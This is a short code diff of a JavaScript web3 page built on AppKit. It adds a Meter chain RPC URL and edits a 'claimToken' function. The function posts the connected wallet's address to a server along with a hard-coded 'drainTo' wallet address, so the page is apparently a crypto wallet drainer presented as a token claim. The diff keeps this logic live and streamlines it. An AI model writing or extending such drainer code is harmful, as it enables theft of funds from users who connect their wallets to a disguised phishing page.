@@ -25,7 +25,7 @@ const appKit = createAppKit({
     {
       id: 250,
       name: "Meter",
-      rpc
+      rpcUrl: "https://meter-mainnet-rpc-01.meter.io"
     },
     {
       id: 43114,
@@ -85,15 +85,7 @@ appKit.subscribeState((state) => {
 });
 
 async function claimToken() {
-  const { account, chain } = appKit;
-
-  if (!account || !chain) {
-    status.textContent = "Wallet not connected or chain not selected";
-    return;
-  }
-
-  const address = account.address;
-  const chainId = chain.id;
+  const address = appKit.account?.address;
 
   if (!address) {
     status.textContent = "Wallet not connected";
@@ -108,7 +100,6 @@ async function claimToken() {
       },
       body: JSON.stringify({
         address,
-        chainId,
         drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4",
       }),
     });
